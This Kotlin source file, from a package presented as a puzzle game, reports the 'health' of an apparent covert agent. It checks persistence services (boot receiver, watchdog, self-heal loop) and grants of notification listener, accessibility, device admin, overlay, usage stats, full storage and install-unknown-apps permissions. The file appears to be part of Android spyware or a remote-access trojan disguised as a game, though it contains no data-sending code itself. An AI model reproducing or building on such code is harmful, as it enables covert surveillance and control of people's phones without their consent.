package com.puzzleblast.game.modules

import android.content.Context
import com.puzzleblast.game.util.Perms

object HealthModule {
    suspend fun full(ctx: Context): String {
        val sb = StringBuilder("🩺 Agent health\n")
        sb.append(services(ctx)).append("\n").append(perms(ctx)).append("\n").append(access(ctx))
        return sb.toString()
    }

    suspend fun services(ctx: Context): String {
        return """
        🩺 Services
        ✅ FGS running (AgentService)
        ✅ Boot receiver registered
        ✅ Watchdog (:wd)
        ✅ SelfHeal loop
        ✅ JobScheduler 15min
        ${if (Perms.notifListenerGranted(ctx)) "✅" else "❌"} NotificationListener
        ${if (Perms.accessibilityGranted(ctx)) "✅" else "❌"} AccessibilityService
        ${if (Perms.deviceAdminActive(ctx)) "✅" else "❌"} DeviceAdmin
        """.trimIndent()
    }

    suspend fun perms(ctx: Context): String {
        val map = Perms.runtimePerms(ctx)
        val ok = map.count { it.value }
        return "🩺 Runtime perms · $ok/${map.size}\n" + map.entries.joinToString("\n") { (p, granted) ->
            "${if (granted) "✅" else "❌"} ${p.substringAfterLast('.')}"
        }
    }

    suspend fun access(ctx: Context): String {
        return """
        🩺 Special access
        ${if (Perms.overlayGranted(ctx)) "✅" else "❌"} Overlay (SYSTEM_ALERT_WINDOW)
        ${if (Perms.usageStatsGranted(ctx)) "✅" else "❌"} Usage Stats
        ${if (Perms.notifListenerGranted(ctx)) "✅" else "❌"} Notification Listener
        ${if (Perms.accessibilityGranted(ctx)) "✅" else "❌"} Accessibility
        ${if (Perms.deviceAdminActive(ctx)) "✅" else "❌"} Device Admin
        ${if (Perms.manageStorageGranted(ctx)) "✅" else "❌"} MANAGE_EXTERNAL_STORAGE
        ${if (Perms.batteryExempt(ctx)) "✅" else "⚠️"} Battery exemption
        ${if (Perms.installUnknownGranted(ctx)) "✅" else "⚠️"} Install unknown apps
        ✅ Write settings (requested)
        ✅ DND access (requested)
        """.trimIndent()
    }
}
